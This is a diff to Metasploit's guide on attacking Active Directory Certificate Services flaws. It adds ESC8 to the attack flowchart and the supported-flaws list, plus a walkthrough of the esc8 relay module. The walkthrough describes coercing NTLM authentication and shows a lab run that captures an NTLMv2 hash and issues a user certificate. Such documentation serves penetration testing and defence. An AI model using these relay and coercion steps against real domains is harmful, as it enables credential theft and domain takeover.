@@ -10,6 +10,10 @@ flowchart TD
         update_template[<i>Update Template</i>]
         ESC4 -- abuse privileges --> update_template
     end
+    subgraph relay/esc8[<b>relay/esc8</b>]
+        ESC8(ESC8)
+        ESC8 --> web_enrollment[<i>Issuance via Web Enrollment</i>]
+    end
     subgraph icpr_cert[<b>icpr_cert</b>]
         ESC1(ESC1)
         ESC2(ESC2)
@@ -45,11 +49,12 @@ flowchart TD
     normal --> PKINIT
     normal --> SCHANNEL
     update_template --> ESC1
+    web_enrollment --> PKINIT
+    web_enrollment --> SCHANNEL
 ```
 
-The chart above showcases how one can go about attacking five unique AD CS
-vulnerabilities, taking advantage of various flaws in how certificate templates are
-configured on an Active Directory Certificate Server.
+The chart above showcases how one can go about attacking each of the AD CS vulnerabilities supported by Metasploit,
+taking advantage of various flaws in how certificate templates are configured on an Active Directory Certificate Server.
 
 The following sections will walk through each of these steps, starting with enumerating
 certificate templates that the server has to offer and identifying those that are
@@ -81,6 +86,7 @@ attacks that they found they could conduct via misconfigured certificate templat
   Manager Approval + Enrollable Client Authentication/Smart Card Logon OID templates
 - ESC7 - Vulnerable Certificate Authority Access Control
 - ESC8 - NTLM Relay to AD CS HTTP Endpoints
+  - [[Exploit Steps|attacking-ad-cs-esc-vulnerabilities.md#exploiting-esc8]]
 
 Later, additional techniques were disclosed by security researchers:
 
@@ -110,8 +116,8 @@ Later, additional techniques were disclosed by security researchers:
   - [EKUwu: Not just another AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
   - [[Exploit Steps|attacking-ad-cs-esc-vulnerabilities.md#exploiting-esc15]]
 
-Currently, Metasploit only supports attacking ESC1, ESC2, ESC3, ESC4, ESC13 and ESC15. As such,
-this page only covers exploiting ESC1 through ESC4, ESC13 and ESC15 at this time.
+Currently, Metasploit only supports attacking ESC1, ESC2, ESC3, ESC4, ESC8, ESC13 and ESC15. As such, this page only
+covers exploiting that subset of ESC flaws.
 
 Before continuing, it should be noted that ESC1 is slightly different than ESC2 and ESC3
 as the diagram notes above. This is because in ESC1, one has control over the
@@ -866,6 +872,55 @@ msf6 auxiliary(admin/ldap/ad_cs_cert_template) >
 At this point the certificate template's configuration has been restored and the operator has a certificate that can be
 used to authenticate to Active Directory as the Domain Admin.
 
+# Exploiting ESC8
+ESC8 leverages relaying NTLM authentication from an SMB server (running on Metasploit) to the HTTP(S) AD CS Web
+Enrollment portal running on a remote target. The attacker will need to coerce a client with privileges to authenticate
+to the target portal to authenticate to Metasploit instead. This can be achieved via a few techniques, including name
+poisoning via the `capture` plugin, coercion via the `auxiliary/scanner/dcerpc/petitpotam` module, or even a well placed
+UNC path. Once authentication has been relayed and an authorized HTTP session has been established, the attacker can
+query available certificate templates as well as issue them.
+
+Exploitation of this flaw is facilitated through the `auxiliary/server/relay/esc8` module which handles starting the SMB
+relay server and enables configuration of what happens when relaying is successful. Users can select from different
+operational "modes" via the MODE datastore option which controls what the module will do. For a full description, see
+the modules documentation. The default mode, "AUTO" will issue a User certificate if the relayed connection is for a
+user account or a Machine certificate if it's for a machine account. Once this certificate has been issued, it can be
+used for authentication. See the [Authenticating With A Certificate](#authenticating-with-a-certificate) section for
+more information.
+
+In the following example the AUTO mode is used to issue a certificate for the MSFLAB\smcintyre once they have
+authenticated.
+
+```msf
+msf6 auxiliary(server/relay/esc8) > set RELAY_TARGETS 172.30.239.85
+msf6 auxiliary(server/relay/esc8) > run
+[*] Auxiliary module running as background job 1.
+msf6 auxiliary(server/relay/esc8) > 
+[*] SMB Server is running. Listening on 0.0.0.0:445
+[*] Server started.
+[*] New request from 192.168.159.129
+[*] Received request for MSFLAB\smcintyre
+[*] Relaying to next target http://172.30.239.85:80/certsrv/
+[+] Identity: MSFLAB\smcintyre - Successfully authenticated against relay target http://172.30.239.85:80/certsrv/
+[SMB] NTLMv2-SSP Client     : 172.30.239.85
+[SMB] NTLMv2-SSP Username   : MSFLAB\smcintyre
+[SMB] NTLMv2-SSP Hash       : smcintyre::MSFLAB:821ad4c6b40475f4:07a6e0fd89d9af86a5b0e12d24915b4d:010100000000000071fe99aa0a27db01eabcbc6e8fcb6ed20000000002000c004d00530046004c00410042000100040044004300040018006d00730066006c00610062002e006c006f00630061006c0003001e00440043002e006d00730066006c00610062002e006c006f00630061006c00050018006d00730066006c00610062002e006c006f00630061006c000700080071fe99aa0a27db01060004000200000008003000300000000000000001000000002000004206ecc9e398d7766166f0f45d8bdcf7708c8f278f2cff1cc58017f9acf0f5400a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100350039002e003100320038000000000000000000
+
+[*] Creating certificate request for MSFLAB\smcintyre using the User template
+[*] Generating CSR...
+[*] CSR Generated
+[*] Requesting relay target generate certificate...
+[+] Certificate generated using template User and MSFLAB\smcintyre
+[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=184&
+[+] Certificate for MSFLAB\smcintyre using template User saved to /home/smcintyre/.msf4/loot/20241025142116_default_172.30.239.85_windows.ad.cs_995918.pfx
+[*] Relay tasks complete; waiting for next login attempt.
+[*] Received request for MSFLAB\smcintyre
+[*] Identity: MSFLAB\smcintyre - All targets relayed to
+[*] New request from 192.168.159.129
+[*] Received request for MSFLAB\smcintyre
+[*] Identity: MSFLAB\smcintyre - All targets relayed to
+```
+
 # Exploiting ESC13
 To exploit ESC13, we need to target a certificate that has an issuance policy linked to a universal group in Active
 Directory. Unlike some of the other ESC techniques, successfully exploiting ESC13 isn't necessarily guaranteed to yield
@@ -873,7 +928,7 @@ administrative privileges, rather the privileges that are gained are those of th
 certificate template's issuance policy. The `auxiliary/gather/ldap_esc_vulnerable_cert_finder` module is capable of
 identifying certificates that meet the necessary criteria. When one is found, the module will include the group whose
 permissions will be included in the resulting Kerberos ticket in the notes section. In the following example, the
-ESC13-Test template is vulenerable to ESC13 and will yield a ticket including the ESC13-Group permissions.
+ESC13-Test template is vulnerable to ESC13 and will yield a ticket including the ESC13-Group permissions.
 
 ```
 msf6 auxiliary(gather/ldap_esc_vulnerable_cert_finder) > run
